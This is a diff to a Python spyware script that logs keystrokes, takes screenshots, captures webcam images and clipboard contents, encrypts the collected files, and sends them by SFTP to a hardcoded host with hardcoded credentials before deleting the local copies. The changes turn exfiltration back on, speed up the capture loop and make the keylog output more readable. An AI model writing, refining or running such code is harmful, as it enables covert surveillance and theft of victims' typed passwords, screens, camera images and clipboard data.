@@ -30,7 +30,7 @@ screenshot_information = ".png"
 time_iterations = 10
 number_of_iterations_end = 3
 
-myHostname = "192.168.1.6"  # change this
+myHostname = "192.168.1.5"  # change this
 myUsername = "pi"  # change this
 myPassword = "kali123"  # change this #should be 8 characters or more including special characters
 remote_file = '/home/pi/transfer/'
@@ -68,17 +68,11 @@ def capture_webcam():
     cv2.imwrite(file_path + extend + time_str + camera_information, frame)
 
 
-capture_webcam()
-
-
 # Capture Screenshots using imgrb or pyscreenshot module
 def screenshots():
     imgrb = ImageGrab.grab()
     time_str = time.strftime("SGB_%Y%m%d_%H%M%S")  # To save each image with the time stamp
     imgrb.save(file_path + extend + time_str + screenshot_information)
-
-
-screenshots()
 
 
 # Encrypting all files in a specific directory using the fernet library
@@ -164,23 +158,46 @@ while number_of_iterations < number_of_iterations_end:  # The keylogger will run
             write_file(keys)
             keys = []
 
-    # writes captured keylogs to a file
+    # writes captured key stokes to a file
     def write_file(keys):
         with open(file_path + extend + keys_information, "a") as f:
             for key in keys:
                 k = str(key).replace("'", "")
-                if k.find("space") > 0:
+                if k == "Key.space": # changes any space key found to ' ' to make it readable
+                    f.write(' ')
+                    f.close()
+                elif k == "Key.backspace": # changes any space key found to ' ' to make it readable
+                    #f.seek(0, 2)
+                    #size = f.tell()
+                    #f.truncate(size -1)
+                    #f.close()
+                    f.write('_BS_')
+                elif k.find("enter") > 0: # changes any enter key found to '\n' (new line) to make it readable
                     f.write('\n')
+                    f.close()
+                elif k.find("delete") > 0:
+                    f.write(".DEL.")
+                    f.close()
+                elif k.find('left') > 0:
+                    f.write("")
+                    f.close()
+                elif k.find('right') > 0:
+                    f.write("")
+                    f.close()
+                elif k.find('shift') > 0:
+                    f.write("")
                     f.close()
                 elif k.find("Keys") == -1:
                     f.write(k)
                     f.close()
+
 
     def on_release(key):
         if key == Key.esc:
             return False
         if currentTime > stopTime:
             return False
+
 
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
@@ -190,13 +207,14 @@ while number_of_iterations < number_of_iterations_end:  # The keylogger will run
         screenshots()
         copy_clipboard()
         capture_webcam()
-        time.sleep(40)
-        read_file()
+        time.sleep(10)
+        # read_file()
         encrypt_files()
-        # sftp_files()
+        sftp_files()
         delete_files()
 
         number_of_iterations += 1
 
         currentTime = time.time()
         stopTime = time.time() + time_iterations
+
